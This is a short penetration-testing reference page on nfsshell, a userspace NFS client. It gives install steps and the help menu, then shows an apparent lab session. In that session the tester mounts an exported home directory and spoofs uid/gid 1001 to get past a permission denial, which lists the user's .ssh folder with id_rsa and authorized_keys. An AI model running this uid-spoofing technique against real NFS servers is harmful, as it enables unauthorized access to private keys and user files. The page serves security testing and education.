---
description: Userspace NFS client shell
---

# nfsshell

### **Install** 

```text
apt-get install libreadline-dev libncurses5-dev 
git clone https://github.com/NetDirect/nfsshell /opt/nfsshell 
cd /opt/nfsshell 
make 
./nfsshell
```

###  Help menu: 

```text
nfs> help 
host <host> - set remote host name 
uid [<uid> [<secret-key>]] - set remote user id 
gid [<gid>] - set remote group id 
cd [<path>] - change remote working directory 
lcd [<path>] - change local working directory 
cat <filespec> - display remote file 
ls [-l] <filespec> - list remote directory 
get <filespec> - get remote files 
df - file system information 
rm <file> - delete remote file 
ln <file1> <file2> - link file 
mv <file1> <file2> - move file 
mkdir <dir> - make remote directory 
rmdir <dir> - remove remote directory 
chmod <mode> <file> - change mode 
chown <uid>[.<gid>] <file> -  change owner 
put <local-file> [<remote-file>] - put file 
mount [-upTU] [-P port] <path> - mount file system 
umount - umount remote file system 
umountall - umount all remote file systems 
export - show all exported file systems 
dump - show all remote mounted file systems 
status - general status report 
help - this help message 
quit - its all in the name 
bye - good bye 
handle [<handle>] - get/set directory file handle 
mknod <name> [b/c major minor] [p] - make device 
```

### Usage 

```text
root@kali:/opt/nfsshell# ./nfsshell  
nfs> host 192.168.0.45 
Using a privileged port (1021) 
Open 192.168.0.45 (192.168.0.45) TCP 
nfs> export 
Export list for 192.168.0.45: 
/home/karl               *  
nfs> mount /home/karl 
Using a privileged port (1020) 
Mount `/home/karl', TCP, transfer size 65536 bytes. 
nfs> ls -l 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  . 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .. 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .bash_history 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .bash_logout 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .bashrc 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .lesshst 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .profile 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .ssh 
nfs> cd .ssh 
nfs> ls 
Readdir failed: Permission denied 
nfs> uid 1001 
nfs> gid 1001 
nfs> ls 
. 
.. 
authorized_keys 
id_rsa 
id_rsa.pub 
user.txt 
nfs>  
```

**resources:**

[https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/](https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/) 

